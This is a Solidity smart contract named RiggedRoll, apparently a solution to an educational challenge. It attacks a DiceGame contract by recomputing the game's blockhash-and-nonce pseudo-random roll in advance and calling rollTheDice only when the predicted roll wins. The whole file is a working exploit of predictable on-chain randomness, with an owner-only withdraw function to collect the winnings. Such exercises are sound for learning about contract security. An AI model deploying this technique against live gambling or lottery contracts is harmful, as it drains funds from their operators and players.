pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    error NotEnoughEther();
    error NotWinningRoll();

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        (bool success, ) = _addr.call{ value: _amount }("");
        require(success, "Failed to send Ether");
    }

    function riggedRoll() external {
        if (address(this).balance < 0.002 ether) {
            revert NotEnoughEther();
        }

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("\t", "   Rigged Roll:", roll);

        if (roll > 5) {
            revert NotWinningRoll();
        }

        diceGame.rollTheDice{ value: 0.002 ether }();
    }

    receive() external payable {}
}
